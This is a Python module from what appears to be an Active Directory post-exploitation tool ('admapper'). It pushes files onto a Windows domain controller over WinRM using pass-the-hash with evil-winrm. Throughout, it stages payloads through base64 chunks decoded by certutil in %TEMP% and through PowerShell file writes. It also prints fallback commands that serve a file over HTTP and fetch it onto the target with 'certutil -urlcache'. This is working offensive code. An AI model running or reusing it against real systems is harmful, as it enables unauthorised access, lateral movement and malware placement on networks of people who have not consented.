from __future__ import annotations

import base64
import re
import subprocess
from pathlib import Path

from admapper.core.output import print_error, print_info, print_success, print_warning
from admapper.core.platform import resolve_executable, subprocess_run_kwargs
from admapper.postex.evil_winrm_output import extract_winrm_command_body
from admapper.winrm.client import WinRMClient, WinRMError

_B64_LINE = 480
_B64_BATCH = 10
_DEFAULT_HTTP_PORT = 8765
_WINRM_TIMEOUT = 120
_UPLOAD_TIMEOUT = 180
_UPLOAD_TIMEOUT_MAX = 600


def _winrm_target(client: WinRMClient) -> str:
    if client.dc_ip and client.dc_ip[0].isdigit():
        return client.dc_ip
    host = client._connected_host or client._nthash_target_host()  # noqa: SLF001
    if host and host[0].isdigit():
        return host
    raise WinRMError(
        f"upload needs DC IP (cannot resolve {host!r}) — run: admapper scan --ip-dc <DC_IP>"
    )


def _winrm_user(client: WinRMClient) -> str:
    return f"{client.domain}\\{client.username}"


def _command_body(client: WinRMClient, result) -> str:  # noqa: ANN001
    return ((result.stdout or "") + "\n" + (getattr(client, "last_raw_output", "") or "")).strip()


def _upload_timeout(file_size: int) -> int:
    """Scale evil-winrm upload timeout for large payloads (SMB over WinRM)."""
    extra = max(0, file_size // 50_000)
    return min(_UPLOAD_TIMEOUT_MAX, _UPLOAD_TIMEOUT + extra)


def _quote_evil_winrm_local(path: Path) -> str:
    """Quote local path for evil-winrm ``upload`` when spaces or quotes appear."""
    text = str(path.resolve())
    if " " in text or "'" in text:
        return f"'{text.replace(chr(39), chr(39) * 2)}'"
    return text


def _clean_evil_winrm_output(output: str) -> str:
    """Strip banners/noise so ``dir`` parsing does not false-positive on stderr."""
    return extract_winrm_command_body(output)


def _parse_dir_size(output: str, filename: str) -> int | None:
    """Parse ``dir`` listing size — ignore evil-winrm stderr lines."""
    body = _clean_evil_winrm_output(output)
    name_esc = re.escape(filename)
    for line in body.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        if re.match(r"^(info|warning|error|evil-winrm)\b", stripped, re.I):
            continue
        match = re.search(rf"(?:^|\s){name_esc}\s+(\d+)\s", line, re.IGNORECASE)
        if match:
            return int(match.group(1))
    return None


def _run_evil_winrm_stdin(client: WinRMClient, script: str, *, timeout: int = _UPLOAD_TIMEOUT) -> str:
    ew = resolve_executable(["evil-winrm"])
    if not ew or not client.nthash:
        raise WinRMError("evil-winrm not found (required for PTH upload)")
    target = _winrm_target(client)
    user = _winrm_user(client)
    cmd = [ew, "-i", target, "-u", user, "-H", client.nthash]
    try:
        proc = subprocess.run(
            cmd,
            input=script,
            capture_output=True,
            text=True,
            timeout=timeout,
            **subprocess_run_kwargs(),
        )
    except subprocess.TimeoutExpired as exc:
        partial = ""
        if exc.stdout:
            partial = exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode(errors="replace")
        client.last_raw_output = partial or f"evil-winrm timeout after {timeout}s"
        raise WinRMError("evil-winrm session timeout") from exc
    combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
    client.last_raw_output = combined.strip()
    if proc.returncode != 0 and not combined.strip():
        raise WinRMError(f"evil-winrm exited {proc.returncode}")
    return combined


def _verify_via_evil_winrm_stdin(
    client: WinRMClient,
    remote_path: str,
    *,
    expected_size: int | None = None,
) -> bool:
    """``dir`` over evil-winrm stdin — reliable when nxc stdout is empty."""
    remote_fwd = remote_path.replace("\\", "/")
    script = f"dir {remote_fwd}\nexit\n"
    try:
        output = _run_evil_winrm_stdin(client, script, timeout=_WINRM_TIMEOUT)
    except WinRMError:
        return False
    name = remote_path.rsplit("\\", 1)[-1]
    size = _parse_dir_size(output, name)
    if size is not None and size > 0:
        return expected_size is None or size == expected_size
    return False


def remote_file_ok(
    client: WinRMClient,
    remote_path: str,
    *,
    expected_size: int | None = None,
) -> bool:
    """Return True if *remote_path* exists (optionally matching byte size)."""
    if client.ticket_method == "nthash" and client.nthash:
        if _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size):
            return True

    safe_cmd = remote_path.replace('"', '\\"')
    listing = client.execute(
        f'dir /-C "{safe_cmd}"',
        shell="cmd",
        timeout=_WINRM_TIMEOUT,
    )
    body = _command_body(client, listing)
    name = remote_path.rsplit("\\", 1)[-1]
    size = _parse_dir_size(body, name)
    if size is not None and size > 0:
        return expected_size is None or size == expected_size

    cmd_check = client.execute(
        f'if exist "{safe_cmd}" (echo ADMAPPER_OK)',
        shell="cmd",
        timeout=_WINRM_TIMEOUT,
    )
    if "ADMAPPER_OK" not in _command_body(client, cmd_check):
        return False
    return expected_size is None


def manual_upload_instructions(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    http_fetch_host: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> str:
    """Copy-paste commands — ``upload`` must run inside interactive evil-winrm."""
    target = _winrm_target(client)
    user = _winrm_user(client)
    nthash = client.nthash or "<hash>"
    local_abs = local_path.resolve()
    remote = remote_path.replace("/", "\\")
    parent = remote.rsplit("\\", 1)[0]
    filename = remote.rsplit("\\", 1)[-1]
    remote_fwd = remote_path.replace("\\", "/")
    lines = [
        "# evil-winrm interactivo — usar / en ruta remota o upload+copy",
        f"evil-winrm -i {target} -u '{user}' -H {nthash}",
        f"mkdir {parent} -Force",
        f"# opción A (recomendada): forward slashes",
        f"upload {local_abs} {remote_fwd}",
        f"dir {remote_fwd}",
        f"# opción B: subir al cwd y copiar",
        f"upload {local_abs} {filename}",
        f"copy .\\{filename} {remote}",
        f"dir {remote}",
        "",
    ]
    if http_fetch_host:
        lines.extend(
            [
                "# Alternativa HTTP",
                f"cd {local_abs.parent} && python3 -m http.server {http_port}",
                f"certutil -f -urlcache -split -f http://{http_fetch_host}:{http_port}/{local_path.name} {remote}",
            ]
        )
    return "\n".join(lines)


def _ensure_parent_dir(client: WinRMClient, remote_path: str) -> None:
    parent = remote_path.rsplit("\\", 1)[0].replace("'", "''")
    client.execute(
        f"New-Item -ItemType Directory -Force -Path '{parent}' | Out-Null",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )


def _stage_certutil_b64(
    client: WinRMClient,
    data: bytes,
    *,
    filename: str,
) -> None:
    """Write base64 to %TEMP% and certutil -decode to %TEMP%\\*filename*."""
    safe_name = filename.replace("'", "''")
    client.execute(
        f"Remove-Item -Force -ErrorAction SilentlyContinue "
        f"(Join-Path $env:TEMP '{safe_name}'),(Join-Path $env:TEMP '.admapper_payload.b64')",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )
    encoded = base64.b64encode(data).decode("ascii")
    lines = [encoded[i : i + _B64_LINE] for i in range(0, len(encoded), _B64_LINE)]
    total = len(lines)
    for batch_start in range(0, total, _B64_BATCH):
        batch = lines[batch_start : batch_start + _B64_BATCH]
        parts = [
            f"Add-Content -Path (Join-Path $env:TEMP '.admapper_payload.b64') "
            f"-Value '{line}' -NoNewline"
            for line in batch
        ]
        client.execute(";".join(parts), shell="powershell", timeout=_WINRM_TIMEOUT)
        done = min(batch_start + len(batch), total)
        print_info(f"upload: certutil staging {done}/{total} b64 lines")
    client.execute(
        f'certutil -f -decode "%TEMP%\\.admapper_payload.b64" "%TEMP%\\{filename}"',
        shell="cmd",
        timeout=_WINRM_TIMEOUT,
    )
    client.execute(
        "Remove-Item -Force -ErrorAction SilentlyContinue "
        "(Join-Path $env:TEMP '.admapper_payload.b64')",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )


def _upload_via_certutil_b64(
    client: WinRMClient,
    data: bytes,
    remote_path: str,
) -> bool:
    """Decode to %TEMP% then Copy-Item — same pattern as manual upload+copy."""
    filename = remote_path.rsplit("\\", 1)[-1]
    safe_name = filename.replace("'", "''")
    final_ps = remote_path.replace("'", "''")
    _stage_certutil_b64(client, data, filename=filename)
    client.execute(
        f"Copy-Item -Force -LiteralPath (Join-Path $env:TEMP '{safe_name}') "
        f"-Destination '{final_ps}'",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )
    client.execute(
        f"Remove-Item -Force -ErrorAction SilentlyContinue "
        f"(Join-Path $env:TEMP '{safe_name}')",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )
    return remote_file_ok(client, remote_path, expected_size=len(data))


def _upload_base64_chunks(
    client: WinRMClient,
    data: bytes,
    remote_path: str,
) -> bool:
    chunk_size = 2_048 if client.ticket_method == "nthash" else 48_000
    remote_ps = remote_path.replace("'", "''")
    client.execute(
        f"Remove-Item -Force -ErrorAction SilentlyContinue '{remote_ps}'",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )
    offset = 0
    while offset < len(data):
        chunk = data[offset : offset + chunk_size]
        b64 = base64.b64encode(chunk).decode("ascii")
        mode = "CreateNew" if offset == 0 else "Append"
        script = (
            f"$p='{remote_ps}';"
            f"$b=[Convert]::FromBase64String('{b64}');"
            f"$fs=[IO.File]::Open($p,[IO.FileMode]::{mode});"
            f"$fs.Write($b,0,$b.Length);$fs.Close()"
        )
        client.execute(script, shell="powershell", timeout=_WINRM_TIMEOUT)
        offset += len(chunk)
    return remote_file_ok(client, remote_path, expected_size=len(data))


def _upload_via_evil_winrm_builtin(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    expected_size: int,
) -> bool:
    """Built-in ``upload`` over evil-winrm stdin (SMB) — same transport as interactive shell."""
    ew = resolve_executable(["evil-winrm"])
    if not ew or not client.nthash:
        return False

    local_q = _quote_evil_winrm_local(local_path)
    remote_fwd = remote_path.replace("\\", "/")
    parent = remote_path.rsplit("\\", 1)[0]
    filename = remote_path.rsplit("\\", 1)[-1]
    remote_bs = remote_path.replace("/", "\\")
    parent_q = f"'{parent}'" if " " in parent else parent
    timeout = _upload_timeout(expected_size)

    direct_script = "\n".join(
        [
            f"mkdir {parent_q} -Force",
            f"upload {local_q} {remote_fwd}",
            f"dir {remote_fwd}",
            "exit",
        ]
    )
    print_info(f"upload: evil-winrm direct → {remote_fwd} (timeout {timeout}s)")
    try:
        _run_evil_winrm_stdin(client, direct_script + "\n", timeout=timeout)
    except WinRMError as exc:
        print_warning(f"upload: evil-winrm direct failed — {exc}")
    if _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size):
        return True

    copy_script = "\n".join(
        [
            f"upload {local_q} {filename}",
            f"copy .\\{filename} {remote_bs}",
            f"dir {remote_fwd}",
            "exit",
        ]
    )
    print_info("upload: evil-winrm upload+copy fallback")
    try:
        _run_evil_winrm_stdin(client, copy_script + "\n", timeout=timeout)
    except WinRMError as exc:
        print_warning(f"upload: evil-winrm copy fallback failed — {exc}")
    return _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size)


def upload_file(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    http_fetch_host: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> None:
    """Upload over WinRM; verify with ``dir`` before reporting success."""
    if not local_path.is_file():
        raise FileNotFoundError(local_path)
    data = local_path.read_bytes()
    expected_size = len(data)
    _ensure_parent_dir(client, remote_path)
    target = _winrm_target(client)

    if client.ticket_method == "nthash" and client.nthash:
        print_info(
            f"upload: evil-winrm builtin @ {target} ({expected_size} bytes → {remote_path})"
        )
        if _upload_via_evil_winrm_builtin(
            client, local_path, remote_path, expected_size=expected_size
        ):
            print_success(f"upload OK — evil-winrm builtin ({expected_size} bytes)")
            return
        print_info("upload: evil-winrm builtin failed — trying certutil staging")
        if _upload_via_certutil_b64(client, data, remote_path):
            print_success(f"upload OK — certutil staging ({expected_size} bytes)")
            return
        print_info("upload: certutil staging failed — trying WinRM binary chunks")
        if _upload_base64_chunks(client, data, remote_path):
            print_success(f"upload OK — base64 chunks ({expected_size} bytes)")
            return
    else:
        if _upload_base64_chunks(client, data, remote_path):
            print_success(f"upload OK — WinRM base64 ({expected_size} bytes)")
            return

    manual = manual_upload_instructions(
        client,
        local_path,
        remote_path,
        http_fetch_host=http_fetch_host,
        http_port=http_port,
    )
    print_error("upload automático falló — usa evil-winrm interactivo (upload builtin):")
    for line in manual.splitlines():
        print_error(f"  {line}")
    raise WinRMError("upload failed — use interactive evil-winrm upload (see above)")


def upload_manual_only_hint(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
) -> None:
    """Print when auto-upload is skipped by design (e.g. --manual-upload)."""
    manual = manual_upload_instructions(client, local_path, remote_path)
    print_info("upload manual requerido — evil-winrm interactivo:")
    for line in manual.splitlines():
        print_info(f"  {line}")
